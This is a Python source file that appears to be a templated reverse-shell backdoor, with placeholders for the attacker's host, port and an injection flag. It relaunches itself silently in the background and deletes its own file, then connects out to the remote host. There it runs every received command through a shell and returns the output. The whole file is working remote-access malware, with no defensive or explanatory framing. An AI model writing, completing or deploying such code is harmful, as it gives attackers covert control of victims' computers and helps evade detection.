import os
import sys
import socket
import threading
import subprocess

from io import StringIO

if not {injection}:
    if len(sys.argv) == 1:
        os.system(f"python3 " + __file__ + " exploit &>/dev/null &")
        exit()
    else:
        os.remove(__file__)

HEADER = 64
PORT = {port}
SEND_BYTES = 1024
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = {host}
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


class Capturing(list):
    def __enter__(self):
        self._stdout = sys.stdout
        sys.stdout = self._stringio = StringIO()
        return self

    def __exit__(self, *args):
        self.extend(self._stringio.getvalue().splitlines())
        del self._stringio  # free up some memory
        sys.stdout = self._stdout


def send(msg):
    try:
        message = msg.encode(FORMAT)
    except:
        message = msg
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    while True:
        if len(message) > SEND_BYTES:
            client.send(message[:SEND_BYTES])
            message = message[SEND_BYTES:]
            if not message:
                break
        else:
            client.send(message)
            break


def cd(path):
    with Capturing() as output:
        if path in ["cd", "~", "$HOME"]:
            os.chdir(os.environ["HOME"])
        try:
            os.chdir(path)
        except FileNotFoundError as e:
            send(str(e))
            return
        except NotADirectoryError as e:
            send(str(e))
            return
    if '\n'.join(output).strip():
        send('\n'.join(output))
    else:
        send('')


def handle_recv(conn):
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT).strip()
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT).strip()
            while not len(msg) == msg_length:
                msg += conn.recv(msg_length - len(msg)).decode(FORMAT)

            if msg == DISCONNECT_MESSAGE:
                connected = False
                break
            if msg.startswith('cd'):
                cd(msg.replace('cd ', ''))
            else:
                shell = subprocess.run(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                if shell.stderr:
                    data = shell.stderr
                elif shell.stdout:
                    data = shell.stdout
                else:
                    data = b""
                if data.strip():
                    send(data.strip())
                else:
                    send('')


def start():
    thread = threading.Thread(target=handle_recv, args=(client,))
    thread.start()


start()
